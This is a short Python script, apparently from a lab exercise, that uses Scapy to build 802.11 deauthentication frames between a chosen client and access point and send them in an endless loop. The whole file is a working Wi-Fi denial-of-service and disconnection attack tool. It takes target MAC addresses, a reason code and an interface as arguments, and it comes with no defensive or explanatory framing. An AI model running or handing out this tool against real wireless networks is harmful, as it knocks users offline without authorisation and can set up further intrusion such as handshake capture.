import argparse
import sys
from scapy.all import *
parser = argparse.ArgumentParser()
parser.add_argument("client", help="MAC address of the targeted STA")
parser.add_argument("ap", help="MAC address of the AP")
parser.add_argument("reason", help="Reason to put in the deauth frame (1, 4, 5, 8)", type=int)
parser.add_argument("interface", help="network interface")
args = parser.parse_args()
if args.reason not in [1, 4, 5, 8]:
    print "Raison invalide"
    sys.exit(0)

emitter = args.ap
receiver = args.client
if args.reason == 8:
    (emitter, receiver) = (receiver, emitter)
print emitter, " ", receiver
    
packet = RadioTap() / Dot11(addr1=receiver, addr2=emitter, addr3=emitter, type=0, subtype=12) / Dot11Deauth(reason=args.reason)
while True:
    sendp(packet, iface=args.interface)

